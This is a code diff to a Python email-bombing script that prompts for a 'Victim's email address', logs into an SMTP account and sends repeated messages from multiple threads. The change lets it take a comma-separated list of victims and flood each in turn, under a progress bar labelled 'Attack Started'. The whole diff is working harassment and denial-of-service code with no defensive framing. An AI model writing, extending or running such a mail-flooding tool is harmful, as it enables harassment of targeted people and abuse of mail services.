@@ -173,7 +173,7 @@ def main():
 
             break
 
-    target = input(green("Victim's email address") + blue(bold("> ")))
+    target = input(green("Victim's email address") + blue(bold("> "))).replace(" ", "").split(",")
 
     level = 0
     while True:
@@ -185,10 +185,10 @@ def main():
         except ValueError:
             Errors.number()
 
-    def send(text="", html=""):
+    def send(to, text="", html=""):
         message = MIMEMultipart('alternative')
         message['From'] = "{} <{}>".format(alias, account)
-        message['To'] = target
+        message['To'] = to
         message['Date'] = formatdate(localtime=True)
 
         if level > 1:
@@ -213,34 +213,37 @@ def main():
                 message.attach(ATTACHMENT)
                 f.close()
 
-        SMTP.sendmail(alias, target, message.as_string())
+        SMTP.sendmail(alias, to, message.as_string())
         bar.next()
 
-    bar = Bar(red(bold("::{}MMA{} Started::")), max=level)
+    bar = Bar(red(bold(":: Attack Started::")), max=level*len(target))
     THREADS = 5
 
-    def attack(single: bool = False):
+    def attack(to, single: bool = False):
         if not single:
             for t in range(math.ceil(level / THREADS)):
-                send(text=text_body, html=html_body)
+                send(to, text=text_body, html=html_body)
                 time.sleep(2)
 
         else:
-            send(text=text_body, html=html_body)
+            send(to, text=text_body, html=html_body)
 
     SMTP.connect(SERVER, PORT)
     SMTP.starttls()
 
     SMTP.login(account, pw)
+    for t in target:
+        if level >= THREADS:
+            for i in range(THREADS):
+                Thread(target=lambda: attack(t)).start()
+                time.sleep(2)
 
-    if level >= THREADS:
-        for i in range(THREADS):
-            Thread(target=lambda: attack()).start()
-            time.sleep(2)
+        else:
+            print(t)
+            for i in range(level):
+                Thread(target=lambda: attack(t, single=True)).start()
 
-    else:
-        for i in range(level):
-            Thread(target=lambda: attack(True)).start()
+        time.sleep(2)
 
 
 if __name__ == "__main__":
